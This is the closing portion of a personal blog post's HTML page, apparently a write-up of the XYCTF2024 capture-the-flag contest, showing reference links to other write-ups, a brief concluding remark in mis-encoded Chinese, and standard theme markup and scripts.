<p><a class="link" href="https://blog.csdn.net/uuzeray/article/details/138274291#ezPOP"  target="_blank" rel="noopener"
    >ã€Webã€‘2024XYCTFé¢˜è§£(å…¨)_xyctf2024-CSDNåšå®¢</a></p>
<p><a class="link" href="https://blog.csdn.net/Err0r233/article/details/138233565"  target="_blank" rel="noopener"
    >XYCTF2024-Webæ–¹å‘é¢˜è§£-CSDNåšå®¢</a></p>
<h2 id="å°ç»“">å°ç»“
</h2><p>æ‹–äº†è¿™ä¹ˆä¹…ï¼Œç»ˆäºæ˜¯ç»“æŸäº†ï¼Œè¿™ä¸ªæ¯”èµ›é¢˜ç›®å¾ˆå¤šï¼Œä¹Ÿå¾ˆæœ‰æ”¶è·ï¼Œä¸»è¦æ˜¯æœ‰è‡ªå·±çš„ç ”ç©¶å‘ç°æˆ‘è§‰å¾—æ˜¯ç‰¹åˆ«å¥½çš„ã€‚</p>

</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025/">
        
        

        <div class="article-details">
            <h2 class="article-title">æå®¢å¤§æŒ‘æˆ˜2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">cyberstrikelabæ¸—é€å¤ç°</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">æ˜¥ç§‹äº‘é•œæ¸—é€å¤ç°</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025%E6%B1%9F%E8%A5%BF%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025æ±Ÿè¥¿ä¿¡æ¯æŠ€æœ¯çœèµ›å†³èµ›</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/qctf2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">qctf2025</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2025 - 
        
        2026 liernian
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
